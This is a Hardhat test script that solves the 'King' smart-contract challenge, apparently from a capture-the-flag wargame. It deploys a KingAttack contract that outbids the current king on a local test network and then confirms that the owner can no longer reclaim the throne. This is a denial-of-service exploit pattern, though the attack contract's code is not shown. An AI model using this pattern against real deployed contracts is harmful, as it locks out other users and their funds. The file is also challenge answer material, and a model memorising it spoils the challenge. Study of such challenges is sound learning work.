const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "King";
const CONTRACT_Attack_NAME = "KingAttack";
describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const King = await ethers.getContractFactory(CONTRACT_NAME);
    const king = await King.deploy({ value: 1000 });
    return { owner, attacker, king };
  }

  it("Challenge Solved", async function () {
    const { owner, attacker, king } = await loadFixture(deployLoadFixture);

    // deploy the Attack contract and take the king, once and for all
    const KingAttack = await ethers.getContractFactory(CONTRACT_Attack_NAME);
    let kingAttack = await KingAttack.connect(attacker).deploy(king.address, {
      value: 1001, // we need to send an amount of ether greater than the current prize(1000 wei)
    });
    await kingAttack.deployed();

    // test
    await expect(owner.sendTransaction({
        to: king.address,
        value: 0,
        gasLimit: 210000
    })).to.be.revertedWith("King can not be set anymore x)")
  });
});
